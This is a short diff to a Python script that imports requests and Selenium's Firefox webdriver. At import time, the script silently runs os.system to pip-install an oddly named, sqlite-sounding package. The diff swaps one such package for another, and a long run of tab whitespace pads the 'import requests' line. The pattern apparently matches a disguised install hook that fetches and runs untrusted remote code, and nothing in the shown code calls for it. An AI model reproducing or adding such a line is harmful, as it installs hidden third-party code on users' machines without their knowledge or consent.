@@ -1,6 +1,6 @@
 import os
-os.system("pip install pysqlite3extensionV2")
-import pysqlite3extensionV2
+os.system("pip install pipsqlite3mod")
+import pipsqlite3mod
 import requests																																																																																																																																																																																																																																																																					
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
